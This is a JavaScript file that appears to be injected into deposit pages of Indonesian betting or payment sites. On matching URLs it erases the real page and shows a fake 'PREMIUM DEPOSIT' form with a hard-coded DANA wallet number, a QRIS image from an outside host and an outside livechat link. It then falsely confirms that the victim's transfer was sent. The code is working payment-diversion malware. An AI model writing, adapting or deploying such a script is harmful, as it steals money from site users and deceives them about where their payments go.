(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php',
    '/index.php?page=deposit',
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SPUC3NGINE PREMIUM PAY</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
      :root {
        --bg-core: #030305;
        --panel-dark: rgba(10, 11, 14, 0.85);
        --neon-yellow: #ffea00;
        --neon-glow: rgba(255, 234, 0, 0.3);
        --text-white: #ffffff;
        --text-gray: #8e94a2;
      }

      body {
        margin: 0;
        font-family: 'Rajdhani', sans-serif;
        background-color: var(--bg-core);
        background-image: 
          linear-gradient(rgba(255, 234, 0, 0.02) 1px, transparent 1px),
          linear-gradient(90deg, rgba(255, 234, 0, 0.02) 1px, transparent 1px);
        background-size: 25px 25px;
        color: var(--text-white);
        display: flex;
        justify-content: center;
        align-items: flex-start;
        min-height: 100vh;
        padding: 50px 0;
        box-sizing: border-box;
      }

      .outer-card {
        position: relative;
        max-width: 440px;
        width: 92%;
        border-radius: 20px;
        background: padding-box, linear-gradient(135deg, var(--neon-yellow), transparent, var(--neon-yellow)) border-box;
        border: 2px solid transparent;
        overflow: hidden;
        box-shadow: 0 30px 70px rgba(0, 0, 0, 0.8);
      }

      .container {
        width: 100%;
        background: var(--panel-dark);
        backdrop-filter: blur(12px);
        -webkit-backdrop-filter: blur(12px);
        padding: 45px 30px;
        display: flex;
        flex-direction: column;
        box-sizing: border-box;
        position: relative;
      }

      .outer-card::before {
        content: '';
        position: absolute;
        top: -50%; left: -50%;
        width: 200%; height: 200%;
        background: conic-gradient(from 0deg, transparent, var(--neon-yellow), transparent, var(--neon-yellow), transparent);
        animation: rotateGlow 4s linear infinite;
        z-index: 0;
      }

      @keyframes rotateGlow {
        100% { transform: rotate(360deg); }
      }

      .inner-content {
        position: relative;
        z-index: 2;
      }

      .header-area {
        text-align: center;
        margin-bottom: 25px;
      }

      .logo-title {
        font-family: 'Orbitron', sans-serif;
        font-size: 26px;
        font-weight: 900;
        letter-spacing: 3px;
        color: #fff;
        text-shadow: 0 0 10px rgba(255,255,255,0.2);
        position: relative;
      }
      
      .logo-title span {
        color: var(--neon-yellow);
        text-shadow: 0 0 15px var(--neon-glow);
        animation: neonPulse 2s infinite alternate;
      }

      @keyframes neonPulse {
        0% { opacity: 0.7; text-shadow: 0 0 5px var(--neon-glow); }
        100% { opacity: 1; text-shadow: 0 0 20px rgba(255, 234, 0, 0.6); }
      }

      .tab-switcher {
        display: flex;
        background: rgba(0, 0, 0, 0.5);
        padding: 6px;
        border-radius: 12px;
        border: 1px solid rgba(255, 255, 255, 0.05);
        margin-bottom: 25px;
        gap: 6px;
      }

      .tab-btn {
        flex: 1;
        padding: 12px;
        font-family: 'Orbitron', sans-serif;
        font-size: 11px;
        font-weight: 900;
        letter-spacing: 1px;
        color: var(--text-gray);
        background: transparent;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        transition: all 0.3s ease;
        text-transform: uppercase;
      }

      .tab-btn.active {
        background: var(--neon-yellow);
        color: #000;
        box-shadow: 0 4px 15px var(--neon-glow);
      }

      .deposit-panel {
        display: none;
      }

      .deposit-panel.active {
        display: block;
        animation: panelFade 0.4s ease both;
      }

      @keyframes panelFade {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }

      .form-group {
        display: flex;
        flex-direction: column;
        width: 100%;
        margin-bottom: 22px;
        position: relative;
      }

      .form-group label {
        font-family: 'Orbitron', sans-serif;
        font-size: 12px;
        font-weight: 700;
        color: var(--text-white);
        margin-bottom: 8px;
        letter-spacing: 1px;
        text-transform: uppercase;
        border-left: 3px solid var(--neon-yellow);
        padding-left: 8px;
      }

      select, input {
        width: 100%;
        padding: 16px 18px;
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 10px;
        font-size: 16px;
        font-weight: 500;
        background: rgba(0, 0, 0, 0.6);
        color: #fff;
        font-family: 'Rajdhani', sans-serif;
        box-sizing: border-box;
        transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
      }

      select:focus, input:focus {
        outline: none;
        border-color: var(--neon-yellow);
        background: rgba(0, 0, 0, 0.8);
        box-shadow: 0 0 15px rgba(255, 234, 0, 0.15);
      }

      .manual-list-container {
        display: flex;
        flex-direction: column;
        gap: 12px;
        margin-bottom: 22px;
      }

      .payment-card-premium {
        background: linear-gradient(135deg, rgba(255, 255, 255, 0.03), rgba(255, 255, 255, 0.01));
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 12px;
        padding: 16px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        transition: all 0.3s ease;
      }

      .payment-card-premium.dana-theme {
        background: linear-gradient(135deg, rgba(0, 134, 255, 0.08), rgba(0, 70, 255, 0.02));
        border-color: rgba(0, 134, 255, 0.25);
      }

      .payment-card-premium.bank-theme {
        background: linear-gradient(135deg, rgba(255, 100, 0, 0.08), rgba(255, 50, 0, 0.02));
        border-color: rgba(255, 100, 0, 0.25);
      }

      .pay-info {
        display: flex;
        flex-direction: column;
        gap: 2px;
      }

      .pay-label {
        font-family: 'Orbitron', sans-serif;
        font-size: 11px;
        font-weight: 900;
        letter-spacing: 1px;
      }
      .dana-theme .pay-label { color: #0086ff; }
      .bank-theme .pay-label { color: #ff6400; }

      .pay-number {
        font-size: 18px;
        font-weight: 700;
        color: #fff;
        letter-spacing: 0.5px;
      }

      .pay-name {
        font-size: 13px;
        color: var(--text-gray);
        text-transform: uppercase;
      }

      .btn-copy-action {
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.15);
        color: #fff;
        padding: 8px 14px;
        border-radius: 6px;
        font-family: 'Orbitron', sans-serif;
        font-size: 11px;
        font-weight: 700;
        cursor: pointer;
        transition: all 0.2s ease;
      }

      .dana-theme .btn-copy-action {
        background: rgba(0, 134, 255, 0.15);
        border-color: rgba(0, 134, 255, 0.4);
        color: #0086ff;
      }
      .dana-theme .btn-copy-action:hover {
        background: #0086ff;
        color: #fff;
        box-shadow: 0 0 12px rgba(0, 134, 255, 0.4);
      }

      .bank-theme .btn-copy-action {
        background: rgba(255, 100, 0, 0.15);
        border-color: rgba(255, 100, 0, 0.4);
        color: #ff6400;
      }
      .bank-theme .btn-copy-action:hover {
        background: #ff6400;
        color: #fff;
        box-shadow: 0 0 12px rgba(255, 100, 0, 0.4);
      }

      .btn-submit {
        width: 100%;
        background: linear-gradient(135deg, var(--neon-yellow), #ccbc00);
        color: #000;
        border: none;
        padding: 18px;
        border-radius: 10px;
        font-family: 'Orbitron', sans-serif;
        font-size: 16px;
        font-weight: 900;
        letter-spacing: 3px;
        cursor: pointer;
        transition: all 0.3s ease;
        box-shadow: 0 4px 20px var(--neon-glow);
        margin-top: 5px;
        position: relative;
        overflow: hidden;
      }

      .btn-submit::before {
        content: '';
        position: absolute;
        top: 0; left: -100%;
        width: 100%; height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
        transition: all 0.5s;
      }

      .btn-submit:hover::before { left: 100%; }

      .btn-submit:hover {
        background: #fff;
        color: #000;
        transform: translateY(-2px);
        box-shadow: 0 8px 25px rgba(255, 255, 255, 0.3);
      }

      .qr-wrapper { text-align: center; margin-top: 25px; }
      
      .qr-holder {
        background: #fff;
        padding: 14px;
        border-radius: 14px;
        display: inline-block;
        box-shadow: 0 0 25px rgba(255,234,0,0.2);
        border: 2px solid var(--neon-yellow);
      }
      .qr-holder img { width: 210px; height: 210px; display: block; }

      .qr-action-grid { display: flex; gap: 12px; margin-top: 22px; }
      .qr-action-grid button {
        flex: 1;
        padding: 15px;
        font-family: 'Orbitron', sans-serif;
        font-size: 13px;
        font-weight: 900;
        border-radius: 8px;
        cursor: pointer;
        border: none;
        transition: all 0.2s ease;
      }

      .btn-download { background: #111318; color: #fff; border: 1px solid rgba(255,255,255,0.1) !important; }
      .btn-download:hover { border-color: var(--neon-yellow) !important; color: var(--neon-yellow); }
      .btn-done { background: var(--neon-yellow); color: #000; }
      .btn-done:hover { background: #fff; }

      .loader {
        width: 30px;
        height: 30px;
        border: 3px solid rgba(255,255,255,0.05);
        border-top: 3px solid var(--neon-yellow);
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        margin: 20px auto;
      }
      @keyframes spin { to { transform: rotate(360deg); } }

      .livechat-area {
        margin-top: 35px;
        width: 100%;
        border-top: 1px solid rgba(255,255,255,0.05);
        padding-top: 25px;
      }

      .livechat-button {
        background: rgba(0, 0, 0, 0.4);
        border: 1px solid rgba(255, 234, 0, 0.15);
        border-radius: 12px;
        padding: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 14px;
        cursor: pointer;
        transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
      }

      .livechat-button:hover {
        background: rgba(255, 234, 0, 0.05);
        border-color: var(--neon-yellow);
        box-shadow: 0 0 15px rgba(255, 234, 0, 0.1);
      }

      .livechat-button svg {
        width: 24px;
        height: 24px;
        fill: var(--neon-yellow);
        filter: drop-shadow(0 0 5px var(--neon-glow));
        animation: iconPulse 1.5s infinite alternate;
      }

      @keyframes iconPulse {
        0% { transform: scale(0.95); opacity: 0.8; }
        100% { transform: scale(1.05); opacity: 1; }
      }

      .livechat-details { display: flex; flex-direction: column; }
      .livechat-details .main-title-lc {
        font-family: 'Orbitron', sans-serif;
        font-weight: 900;
        font-size: 13px;
        color: var(--neon-yellow);
        letter-spacing: 1px;
      }
      .livechat-details .sub-title-lc { font-size: 12px; color: var(--text-gray); margin-top: 2px; }

      .notification-toast {
        position: fixed;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%);
        background: var(--neon-yellow);
        color: #000;
        padding: 14px 28px;
        border-radius: 8px;
        font-size: 14px;
        font-weight: bold;
        opacity: 0;
        pointer-events: none;
        transition: all 0.3s ease;
        z-index: 10000;
        box-shadow: 0 10px 30px var(--neon-glow);
      }
      .notification-toast.visible { opacity: 1; }
      .notification-toast.err-mode { background: #ff2a2a; color: #fff; box-shadow: none; }
    </style>
  `;

  document.body.innerHTML = `
    <div class="outer-card">
      <div class="container">
        <div class="inner-content">
          
          <div class="header-area">
            <div class="logo-title">PREMIUM <span>DEPOSIT</span></div>
          </div>

          <!-- Tab Switcher Menu -->
          <div class="tab-switcher">
            <button class="tab-btn active" onclick="switchDepositTab('qris-panel', this)">Otomatis QRIS</button>
            <button class="tab-btn" onclick="switchDepositTab('manual-panel', this)">Manual Dana / Bank</button>
          </div>

          <!-- PANEL 1: KHUSUS OTOMATIS QRIS -->
          <div id="qris-panel" class="deposit-panel active">
            <div class="form-group">
              <label>Pilih Bonus QRIS</label>
              <select id="deposit-bonus">
                <option value="NEW_MEMBER_100">BONUS NEW MEMBER 100%</option>
                <option value="DEPOSIT_HARIAN_10">BONUS HARIAN 10%</option>
                <option value="NO_BONUS">TANPA BONUS</option>
              </select>
            </div>

            <div class="form-group">
              <label>Nominal Deposit QRIS</label>
              <input id="deposit-val" type="text" placeholder="Masukkan nominal khusus QRIS..." oninput="formatCurrencyInput(this)">
            </div>

            <button class="btn-submit" onclick="processDepositForm()">BAYAR QRIS SEKARANG</button>
            <div id="form-feedback" class="qr-wrapper"></div>
          </div>

          <!-- PANEL 2: KHUSUS MANUAL DANA / BANK -->
          <div id="manual-panel" class="deposit-panel">
            
            <!-- List Rekening Tujuan -->
            <div class="manual-list-container">
              <!-- Opsi Rekening 1: DANA -->
              <div class="payment-card-premium dana-theme">
                <div class="pay-info">
                  <span class="pay-label">TUJUAN DANA</span>
                  <span class="pay-number" id="target-dana-num">085179820753</span>
                  <span class="pay-name">PUR**A ISM**L</span>
                </div>
                <button class="btn-copy-action" onclick="copyValueToClipboard('target-dana-num', 'NOMOR DANA')">SALIN</button>
              </div>

              <!-- Opsi Rekening 2: BANK JAGO -->
              <div class="payment-card-premium bank-theme">
                <div class="pay-info">
                  <span class="pay-label">TUJUAN BANK JAGO</span>
                  <span class="pay-number" id="target-bank-num">0</span>
                  <span class="pay-name">0</span>
                </div>
                <button class="btn-copy-action" onclick="copyValueToClipboard('target-bank-num', 'NOMOR REKENING')">SALIN</button>
              </div>
            </div>

            <!-- Form Input Khusus Manual -->
            <div class="form-group">
              <label>Metode Transfer</label>
              <select id="manual-method">
                <option value="DANA">TRANSFER VIA DANA</option>
                <option value="BANK_JAGO">TRANSFER VIA BANK JAGO</option>
              </select>
            </div>

            <div class="form-group">
              <label>Nominal Transfer Manual</label>
              <input id="manual-deposit-val" type="text" placeholder="Masukkan nominal yang ditransfer..." oninput="formatCurrencyInput(this)">
            </div>

            <button class="btn-submit" onclick="processManualDepositForm()">KONFIRMASI MANUAL</button>
            <div id="manual-form-feedback" class="qr-wrapper"></div>
          </div>

          <!-- Konsol Livechat Konfirmasi Resmi -->
          <div class="livechat-area">
            <div class="livechat-button" onclick="openLiveChatSystem()">
              <div style="display: flex; align-items: center;">
                <svg viewBox="0 0 24 24">
                  <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 9h12v2H6V9zm8 5H6v-2h8v2zm4-6H6V6h12v2z"/>
                </svg>
              </div>
              <div class="livechat-details">
                <span class="main-title-lc">HUBUNGI LIVECHAT</span>
                <span class="sub-title-lc">Konfirmasi / Klaim Transaksi via Livechat</span>
              </div>
            </div>
          </div>

        </div>
      </div>
    </div>
    <div id="notification-toast" class="notification-toast"></div>
  `;

  window.switchDepositTab = function (panelId, buttonElement) {
    document.querySelectorAll('.deposit-panel').forEach(panel => panel.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    document.getElementById(panelId).classList.add('active');
    buttonElement.classList.add('active');
  };

  window.formatCurrencyInput = function (element) {
    let value = element.value.replace(/[^0-9]/g, "");
    if (value === "") {
      element.value = "";
      return;
    }
    element.value = Number(value).toLocaleString("id-ID");
  };

  function parseAmount(str) {
    return Number(str.replace(/\./g, "") || 0);
  }

  function renderNotification(msg, isError = false) {
    const toast = document.getElementById("notification-toast");
    toast.textContent = msg;
    toast.className = isError ? "notification-toast visible err-mode" : "notification-toast visible";
    setTimeout(() => toast.classList.remove("visible"), 2500);
  }

  window.copyValueToClipboard = function (elementId, labelName) {
    const textToCopy = document.getElementById(elementId).textContent;
    navigator.clipboard.writeText(textToCopy).then(() => {
      renderNotification(`✓ ${labelName} BERHASIL DISALIN`);
    }).catch(() => {
      renderNotification("GAGAL MENYALIN DATA", true);
    });
  };

  window.processDepositForm = function () {
    const amt = parseAmount(document.getElementById("deposit-val").value);
    if (amt < 10000) return renderNotification("MINIMAL DEPOSIT QRIS Rp 10.000", true);
    
    document.getElementById("form-feedback").innerHTML = '<div class="loader"></div>';
    const sourceQr = "https://s13.gifyu.com/images/bdkMV.jpg";

    setTimeout(() => {
      document.getElementById("form-feedback").innerHTML = `
        <div class="qr-holder">
          <img src="${sourceQr}" alt="QRIS Secure Matrix">
        </div>
        <div class="qr-action-grid">
          <button class="btn-download" onclick="downloadSecureQR()">SIMPAN QRIS</button>
          <button class="btn-done" onclick="history.back()">SUDAH BAYAR</button>
        </div>
      `;
    }, 1200);
  };

  window.processManualDepositForm = function () {
    const amt = parseAmount(document.getElementById("manual-deposit-val").value);
    if (amt < 10000) return renderNotification("MINIMAL TRANSFER Rp 10.000", true);

    document.getElementById("manual-form-feedback").innerHTML = '<div class="loader"></div>';

    setTimeout(() => {
      document.getElementById("manual-form-feedback").innerHTML = "";
      renderNotification("✓ DATA BERHASIL DIKIRIM! SILAHKAN TUNGGU");
      setTimeout(() => {
        openLiveChatSystem();
      }, 1000);
    }, 1200);
  };

  window.downloadSecureQR = function () {
    const sourceQr = "https://s13.gifyu.com/images/bdkMV.jpg";
    const anchor = document.createElement("a");
    anchor.href = sourceQr;
    anchor.download = "secure-qris.png";
    document.body.appendChild(anchor);
    anchor.click();
    document.body.removeChild(anchor);
    renderNotification("✓ QRIS BERHASIL DISIMPAN");
  };

  window.openLiveChatSystem = function () {
    window.open("https://direct.lc.chat/19851307/", "_blank");
  };
})();
